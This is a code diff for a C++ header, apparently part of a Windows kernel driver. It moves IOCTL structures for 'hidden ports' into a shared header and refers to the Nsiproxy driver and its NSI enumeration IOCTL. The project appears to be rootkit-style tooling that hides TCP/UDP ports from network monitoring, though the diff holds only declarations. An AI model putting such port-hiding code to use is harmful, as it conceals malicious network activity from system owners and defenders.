@@ -1,5 +1,6 @@
 #pragma once
 #include "pch.h"
+#include "IoctlShared.h"
 #include "MemoryHelper.h"
 
 extern "C" {
@@ -13,12 +14,6 @@ constexpr ULONG IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS = 0x12001B;
 constexpr WCHAR NSI_DRIVER_NAME[] = L"\\Driver\\Nsiproxy";
 constexpr USHORT htohs(USHORT port) { return (((port >> 8) & 0x00FF) | ((port << 8) & 0xFF00)); }
 
-enum class PortType {
-	TCP,
-	UDP,
-	All
-};
-
 struct InputHiddenPort {
 	bool Hide;
 	bool Remote;
@@ -31,17 +26,6 @@ struct HiddenPort {
 	bool Remote;
 	PortType Type;
 	USHORT Port;
-};
-
-struct IoctlHiddenPort {
-	bool Remote;
-	USHORT Port;
-};
-
-struct IoctlHiddenPorts {
-	IoctlHiddenPort* Ports;
-	SIZE_T Count;
-	PortType Type;
 };
 
 struct HiddenPorts {
